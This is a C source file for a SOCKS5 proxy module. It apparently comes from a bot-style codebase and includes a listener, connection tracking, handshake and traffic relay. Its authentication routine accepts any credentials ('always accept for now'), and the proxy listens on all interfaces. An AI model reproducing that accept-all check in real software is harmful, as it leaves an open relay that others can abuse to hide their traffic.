#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <netdb.h>
#include <pthread.h>

#include "includes.h"
#include "proxy.h"
#include "protocol.h"
#include "util.h"

static proxy_server_t proxy_server;
static pthread_t proxy_thread;

BOOL proxy_init(void) {
    util_zero(&proxy_server, sizeof(proxy_server_t));
    pthread_mutex_init(&proxy_server.mutex, NULL);
    proxy_server.running = 0;
    proxy_server.port = 0;
    proxy_server.auth_required = 0;
    proxy_server.max_connections = MAX_PROXY_CONNECTIONS;
    proxy_server.bandwidth_limit = 0;
    
    #ifdef DEBUG
    printf("(proxy/init): Proxy module initialized\n");
    #endif
    
    return TRUE;
}

static void *proxy_listen_thread(void *arg) {
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    
    while (proxy_server.running) {
        int client_fd = accept(proxy_server.listen_fd, 
                              (struct sockaddr *)&client_addr, 
                              &client_len);
        
        if (client_fd < 0) {
            if (errno == EINTR || errno == EAGAIN) {
                continue;
            }
            #ifdef DEBUG
            printf("(proxy/listen): Accept failed: %s\n", strerror(errno));
            #endif
            continue;
        }
        
        #ifdef DEBUG
        printf("(proxy/listen): New connection from %s:%d\n",
               inet_ntoa(client_addr.sin_addr),
               ntohs(client_addr.sin_port));
        #endif
        
        int conn_idx = proxy_add_connection(client_fd, &client_addr);
        if (conn_idx < 0) {
            #ifdef DEBUG
            printf("(proxy/listen): Max connections reached, closing\n");
            #endif
            close(client_fd);
            continue;
        }
    }
    
    return NULL;
}

void proxy_start(uint16_t port, struct proxy_config *config) {
    if (proxy_server.running) {
        #ifdef DEBUG
        printf("(proxy/start): Proxy already running\n");
        #endif
        return;
    }
    
    proxy_server.listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (proxy_server.listen_fd < 0) {
        #ifdef DEBUG
        printf("(proxy/start): Socket creation failed\n");
        #endif
        return;
    }
    
    int opt = 1;
    setsockopt(proxy_server.listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in listen_addr;
    util_zero(&listen_addr, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(port);
    
    if (bind(proxy_server.listen_fd, (struct sockaddr *)&listen_addr, 
             sizeof(listen_addr)) < 0) {
        #ifdef DEBUG
        printf("(proxy/start): Bind failed on port %d\n", port);
        #endif
        close(proxy_server.listen_fd);
        return;
    }
    
    if (listen(proxy_server.listen_fd, 10) < 0) {
        #ifdef DEBUG
        printf("(proxy/start): Listen failed\n");
        #endif
        close(proxy_server.listen_fd);
        return;
    }
    
    proxy_server.port = port;
    proxy_server.running = 1;
    
    if (config != NULL) {
        proxy_server.auth_required = config->auth_required;
        proxy_server.max_connections = config->max_connections;
        proxy_server.bandwidth_limit = config->bandwidth_limit;
    }
    
    pthread_create(&proxy_thread, NULL, proxy_listen_thread, NULL);
    
    #ifdef DEBUG
    printf("(proxy/start): SOCKS5 proxy started on port %d\n", port);
    #endif
}

void proxy_stop(void) {
    if (!proxy_server.running) {
        return;
    }
    
    proxy_server.running = 0;
    
    if (proxy_server.listen_fd >= 0) {
        close(proxy_server.listen_fd);
        proxy_server.listen_fd = -1;
    }
    
    proxy_cleanup_connections();
    
    #ifdef DEBUG
    printf("(proxy/stop): Proxy stopped\n");
    #endif
}

int proxy_add_connection(int client_fd, struct sockaddr_in *client_addr) {
    pthread_mutex_lock(&proxy_server.mutex);
    
    int free_slot = -1;
    int active_count = 0;
    
    for (int i = 0; i < MAX_PROXY_CONNECTIONS; i++) {
        if (proxy_server.connections[i].active) {
            active_count++;
        } else if (free_slot == -1) {
            free_slot = i;
        }
    }
    
    if (free_slot == -1 || active_count >= proxy_server.max_connections) {
        pthread_mutex_unlock(&proxy_server.mutex);
        return -1;
    }
    
    proxy_connection_t *conn = &proxy_server.connections[free_slot];
    util_zero(conn, sizeof(proxy_connection_t));
    
    conn->client_fd = client_fd;
    conn->remote_fd = -1;
    conn->client_addr = *client_addr;
    conn->start_time = time(NULL);
    conn->active = 1;
    conn->bytes_sent = 0;
    conn->bytes_received = 0;
    
    pthread_create(&conn->thread, NULL, 
                   (void *(*)(void *))socks5_handle_client, 
                   (void *)(long)client_fd);
    pthread_detach(conn->thread);
    
    proxy_server.stats.connections_total++;
    proxy_server.stats.connections_active++;
    
    pthread_mutex_unlock(&proxy_server.mutex);
    
    return free_slot;
}

void proxy_remove_connection(int index) {
    if (index < 0 || index >= MAX_PROXY_CONNECTIONS) {
        return;
    }
    
    pthread_mutex_lock(&proxy_server.mutex);
    
    proxy_connection_t *conn = &proxy_server.connections[index];
    
    if (conn->active) {
        if (conn->client_fd >= 0) {
            close(conn->client_fd);
        }
        if (conn->remote_fd >= 0) {
            close(conn->remote_fd);
        }
        
        proxy_server.stats.bytes_sent += conn->bytes_sent;
        proxy_server.stats.bytes_received += conn->bytes_received;
        proxy_server.stats.connections_active--;
        
        conn->active = 0;
    }
    
    pthread_mutex_unlock(&proxy_server.mutex);
}

void proxy_cleanup_connections(void) {
    for (int i = 0; i < MAX_PROXY_CONNECTIONS; i++) {
        if (proxy_server.connections[i].active) {
            proxy_remove_connection(i);
        }
    }
}

int socks5_handle_client(int client_fd) {
    struct sockaddr_in remote_addr;
    
    // SOCKS5 handshake
    if (socks5_handshake(client_fd) < 0) {
        #ifdef DEBUG
        printf("(socks5/handle): Handshake failed\n");
        #endif
        close(client_fd);
        return -1;
    }
    
    // Authentication if required
    if (proxy_server.auth_required) {
        if (socks5_auth(client_fd) < 0) {
            #ifdef DEBUG
            printf("(socks5/handle): Authentication failed\n");
            #endif
            close(client_fd);
            return -1;
        }
    }
    
    // Connect to remote host
    int remote_fd = socks5_connect(client_fd, &remote_addr);
    if (remote_fd < 0) {
        close(client_fd);
        return -1;
    }
    
    // Relay data
    socks5_relay(client_fd, remote_fd);
    
    close(client_fd);
    close(remote_fd);
    
    return 0;
}

int socks5_handshake(int client_fd) {
    uint8_t buffer[257];
    
    // Read method selection message
    int n = recv(client_fd, buffer, 2, 0);
    if (n < 2 || buffer[0] != SOCKS5_VERSION) {
        return -1;
    }
    
    uint8_t nmethods = buffer[1];
    if (nmethods == 0) {
        return -1;
    }
    
    n = recv(client_fd, buffer + 2, nmethods, 0);
    if (n < nmethods) {
        return -1;
    }
    
    // Check if NO AUTH method is available
    uint8_t method = SOCKS5_AUTH_NO_ACCEPTABLE;
    for (int i = 0; i < nmethods; i++) {
        if (!proxy_server.auth_required && buffer[2 + i] == SOCKS5_AUTH_NONE) {
            method = SOCKS5_AUTH_NONE;
            break;
        } else if (proxy_server.auth_required && buffer[2 + i] == SOCKS5_AUTH_USERPASS) {
            method = SOCKS5_AUTH_USERPASS;
            break;
        }
    }
    
    // Send method selection response
    struct socks5_method_resp resp;
    resp.version = SOCKS5_VERSION;
    resp.method = method;
    
    if (send(client_fd, &resp, sizeof(resp), 0) < 0) {
        return -1;
    }
    
    if (method == SOCKS5_AUTH_NO_ACCEPTABLE) {
        return -1;
    }
    
    return 0;
}

int socks5_auth(int client_fd) {
    // Simplified auth - always accept for now
    uint8_t buffer[512];
    
    int n = recv(client_fd, buffer, 2, 0);
    if (n < 2) {
        return -1;
    }
    
    uint8_t ulen = buffer[1];
    n = recv(client_fd, buffer, ulen + 1, 0);
    if (n < ulen + 1) {
        return -1;
    }
    
    uint8_t plen = buffer[ulen];
    n = recv(client_fd, buffer, plen, 0);
    if (n < plen) {
        return -1;
    }
    
    struct socks5_auth_resp resp;
    resp.version = 0x01;
    resp.status = 0x00; // Success
    
    send(client_fd, &resp, sizeof(resp), 0);
    
    return 0;
}

int socks5_connect(int client_fd, struct sockaddr_in *remote_addr) {
    uint8_t buffer[512];
    
    // Read connection request
    int n = recv(client_fd, buffer, 4, 0);
    if (n < 4 || buffer[0] != SOCKS5_VERSION) {
        return -1;
    }
    
    uint8_t cmd = buffer[1];
    uint8_t atyp = buffer[3];
    
    if (cmd != SOCKS5_CMD_CONNECT) {
        struct socks5_response resp;
        resp.version = SOCKS5_VERSION;
        resp.rep = SOCKS5_REP_COMMAND_NOT_SUPPORTED;
        resp.rsv = 0;
        resp.atyp = SOCKS5_ATYP_IPV4;
        send(client_fd, &resp, sizeof(resp), 0);
        send(client_fd, "\x00\x00\x00\x00\x00\x00", 6, 0);
        return -1;
    }
    
    uint32_t dst_addr;
    uint16_t dst_port;
    
    if (atyp == SOCKS5_ATYP_IPV4) {
        n = recv(client_fd, &dst_addr, 4, 0);
        n = recv(client_fd, &dst_port, 2, 0);
    } else if (atyp == SOCKS5_ATYP_DOMAIN) {
        uint8_t domain_len;
        recv(client_fd, &domain_len, 1, 0);
        recv(client_fd, buffer, domain_len, 0);
        buffer[domain_len] = '\0';
        recv(client_fd, &dst_port, 2, 0);
        
        struct hostent *host = gethostbyname((char *)buffer);
        if (host == NULL) {
            struct socks5_response resp;
            resp.version = SOCKS5_VERSION;
            resp.rep = SOCKS5_REP_HOST_UNREACHABLE;
            resp.rsv = 0;
            resp.atyp = SOCKS5_ATYP_IPV4;
            send(client_fd, &resp, sizeof(resp), 0);
            send(client_fd, "\x00\x00\x00\x00\x00\x00", 6, 0);
            return -1;
        }
        
        memcpy(&dst_addr, host->h_addr, 4);
    } else {
        struct socks5_response resp;
        resp.version = SOCKS5_VERSION;
        resp.rep = SOCKS5_REP_ADDRESS_TYPE_NOT_SUPPORTED;
        resp.rsv = 0;
        resp.atyp = SOCKS5_ATYP_IPV4;
        send(client_fd, &resp, sizeof(resp), 0);
        send(client_fd, "\x00\x00\x00\x00\x00\x00", 6, 0);
        return -1;
    }
    
    // Create connection to remote host
    int remote_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (remote_fd < 0) {
        struct socks5_response resp;
        resp.version = SOCKS5_VERSION;
        resp.rep = SOCKS5_REP_GENERAL_FAILURE;
        resp.rsv = 0;
        resp.atyp = SOCKS5_ATYP_IPV4;
        send(client_fd, &resp, sizeof(resp), 0);
        send(client_fd, "\x00\x00\x00\x00\x00\x00", 6, 0);
        return -1;
    }
    
    util_zero(remote_addr, sizeof(struct sockaddr_in));
    remote_addr->sin_family = AF_INET;
    remote_addr->sin_addr.s_addr = dst_addr;
    remote_addr->sin_port = dst_port;
    
    if (connect(remote_fd, (struct sockaddr *)remote_addr, sizeof(struct sockaddr_in)) < 0) {
        close(remote_fd);
        struct socks5_response resp;
        resp.version = SOCKS5_VERSION;
        resp.rep = SOCKS5_REP_CONNECTION_REFUSED;
        resp.rsv = 0;
        resp.atyp = SOCKS5_ATYP_IPV4;
        send(client_fd, &resp, sizeof(resp), 0);
        send(client_fd, "\x00\x00\x00\x00\x00\x00", 6, 0);
        return -1;
    }
    
    // Send success response
    struct socks5_response resp;
    resp.version = SOCKS5_VERSION;
    resp.rep = SOCKS5_REP_SUCCESS;
    resp.rsv = 0;
    resp.atyp = SOCKS5_ATYP_IPV4;
    send(client_fd, &resp, sizeof(resp), 0);
    
    uint32_t bind_addr = 0;
    uint16_t bind_port = 0;
    send(client_fd, &bind_addr, 4, 0);
    send(client_fd, &bind_port, 2, 0);
    
    return remote_fd;
}

void socks5_relay(int client_fd, int remote_fd) {
    fd_set readfds;
    uint8_t buffer[PROXY_BUFFER_SIZE];
    int maxfd = (client_fd > remote_fd) ? client_fd : remote_fd;
    
    while (1) {
        FD_ZERO(&readfds);
        FD_SET(client_fd, &readfds);
        FD_SET(remote_fd, &readfds);
        
        struct timeval timeout;
        timeout.tv_sec = PROXY_TIMEOUT;
        timeout.tv_usec = 0;
        
        int activity = select(maxfd + 1, &readfds, NULL, NULL, &timeout);
        
        if (activity <= 0) {
            break;
        }
        
        if (FD_ISSET(client_fd, &readfds)) {
            int n = recv(client_fd, buffer, PROXY_BUFFER_SIZE, 0);
            if (n <= 0) {
                break;
            }
            
            if (send(remote_fd, buffer, n, 0) <= 0) {
                break;
            }
        }
        
        if (FD_ISSET(remote_fd, &readfds)) {
            int n = recv(remote_fd, buffer, PROXY_BUFFER_SIZE, 0);
            if (n <= 0) {
                break;
            }
            
            if (send(client_fd, buffer, n, 0) <= 0) {
                break;
            }
        }
    }
}

void proxy_get_stats(struct proxy_stats *stats) {
    pthread_mutex_lock(&proxy_server.mutex);
    *stats = proxy_server.stats;
    stats->uptime = (uint32_t)(time(NULL) - proxy_server.stats.uptime);
    pthread_mutex_unlock(&proxy_server.mutex);
}

uint8_t proxy_get_status(void) {
    return proxy_server.running ? PROXY_STATUS_RUNNING : PROXY_STATUS_IDLE;
}
